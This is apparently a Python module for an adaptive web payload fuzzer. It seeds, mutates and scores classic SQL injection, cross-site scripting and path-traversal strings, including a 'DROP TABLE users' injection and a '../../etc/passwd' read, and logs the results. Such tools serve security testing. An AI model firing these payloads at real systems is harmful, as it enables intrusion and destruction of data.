import random, json, os, hashlib
from pathlib import Path
from datetime import datetime
from scoring.scoring_engine import score_payload

class SmartMutator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.history = []
        self.seed_payloads = [
            "' OR 1=1 --", "<script>alert(1)</script>",
            "'; DROP TABLE users; --", "../../etc/passwd",
            "<img src=x onerror=alert(1)>", "admin'--"
        ]

    def _load_history(self):
        if not os.path.exists("scoring/adaptive_score.jsonl"):
            return []
        with open("scoring/adaptive_score.jsonl", "r") as f:
            return [json.loads(l) for l in f]

    def _mutate(self, base, mode):
        if mode == "clone":
            return base
        if mode == "aggressive":
            return base.replace("1", str(random.randint(2, 99))).replace("alert", f"alert{random.randint(10,999)}")
        return base + random.choice(["--", "%00", "'", '"'])

    def generate_payloads(self, count=10, mode="normal"):
        top = sorted(self._load_history(), key=lambda x: x.get("score", 0), reverse=True)[:5]
        out = []
        for _ in range(count):
            base = random.choice(top)["payload"] if top else random.choice(self.seed_payloads)
            mutated = self._mutate(base, mode)
            result = score_payload(mutated, self._infer_category(mutated))
            out.append(result)
            print(f"[+] {mutated} | Score: {result['score']}")
        self.history.extend(out)
        return out

    def _infer_category(self, p):
        if "script" in p: return "XSS"
        if "OR" in p or "--" in p: return "SQLi"
        if "etc/passwd" in p: return "LFI"
        return "Generic"

    def log_session(self):
        sid = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        p = Path(f"logs/mut_{sid}.json")
        p.parent.mkdir(parents=True, exist_ok=True)
        with open(p, "w") as f: json.dump(self.history, f, indent=2)
